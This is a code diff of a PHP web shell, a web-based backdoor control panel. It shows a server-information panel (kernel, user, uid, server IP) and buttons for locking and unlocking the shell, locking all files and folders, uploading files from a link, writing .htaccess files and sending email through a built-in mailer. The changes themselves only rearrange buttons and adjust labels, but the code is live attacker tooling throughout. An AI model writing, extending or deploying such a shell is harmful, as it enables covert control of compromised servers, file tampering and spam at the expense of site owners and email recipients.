@@ -395,7 +395,7 @@ $Array = [
 				<div class='box shadow bg-light p-3 rounded-3'>
 				System: <gr>$kernel</gr><br>
 				User: <gr>$user</gr> ($uid) | Group: <gr>$group</gr> ($gid)<br>
-				PHP Version: <gr>$phpver</gr>PHP os: <gr>$phpos</gr><br>
+				PHP Version: <gr>$phpver</gr> PHP os: <gr>$phpos</gr><br>
 				Software: <gr>$soft</gr><br>
 				Domain: <gr>$domen</gr><br>
 				Server Ip: <gr>$ip</gr><br>
@@ -423,7 +423,15 @@ $Array = [
 			<div class='btn-group'>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=lockshell'><i class='bi bi-file-earmark-lock'></i> Lock Shell</a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=unlockshell'><i class='bi bi-file-earmark'></i> Unlock Shell</a>
+			</div>
+			<div class='btn-group'>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=phpmailer'><i class='bi bi-envelope'></i> PHP Mailer</a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=searchbyEXT'><i class='bi bi-braces'></i> Search By EXT</a>
 			</div><br><br>
+			<div class='btn-group'>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=uploadvialink'><i class='bi bi-upload'></i> Upload Via Link</a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=createhates'><i class='bi bi-file-earmark-plus'></i> Create Htaccess</a>
+			</div>
 			<div class='btn-group'>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=root_file'><i class='bi bi-file-earmark'></i> Green All File</a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=root_folders'><i class='bi bi-folder'></i> Green All Folders</a>
@@ -431,14 +439,6 @@ $Array = [
 			<div class='btn-group'>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=dark_file'><i class='bi bi-file-earmark-lock'></i> Lock All File</a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=dark_folders'><i class='bi bi-folder-x'></i> Lock All Folders</a>
-			</div>
-			<div class='btn-group'>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=phpmailer'><i class='bi bi-envelope'></i> PHP Mailer</a>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=searchbyEXT'><i class='bi bi-braces'></i> Search By EXT</a>
-			</div>
-			<div class='btn-group'>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=uploadvialink'><i class='bi bi-upload'></i> Upload Via Link</a>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=createhates'><i class='bi bi-file-earmark-plus'></i> Create Htaccess</a>
 			</div>
 			<div class='btn-group'>
 				<a class='btn btn-outline-light btn-sm' href='?logout=true'><i class='bi bi-box-arrow-in-left'></i> Logout</a>
@@ -1353,9 +1353,9 @@ $Array = [
 				$pesan = isset($_POST["pesan"]) ? $_POST["pesan"] : '';
 				if (filter_var($email_penerima, FILTER_VALIDATE_EMAIL)) {
 					if (@mail($email_penerima, $subjek, $pesan)) {
-						echo '<strong>PHPMailer</strong> ok! '.ok().'</div>';
+						echo '<strong>PHPMailer</strong> Sending! '.ok().'</div>';
 					} else {
-						echo '<strong>PHPMailer</strong> fail! '.er().'</div>'; 
+						echo '<strong>PHPMailer</strong> failed! '.er().'</div>'; 
 					}
 				} else {
 					echo '<strong>Invalid email address</strong> fail! '.er().'</div>'; 
@@ -1384,7 +1384,7 @@ $Array = [
 					<textarea class='form-control btn-sm' rows='7' name='pesan' placeholder='Message'></textarea>
 				</div>
 				<div class='d-grid gap-2'>
-					<button type='submit' name='phpmailer' class='btn btn-primary'>Upload</button>
+					<button type='submit' name='phpmailer' class='btn btn-primary'>Sending</button>
 				</div>
 			</form>
 		</div>";
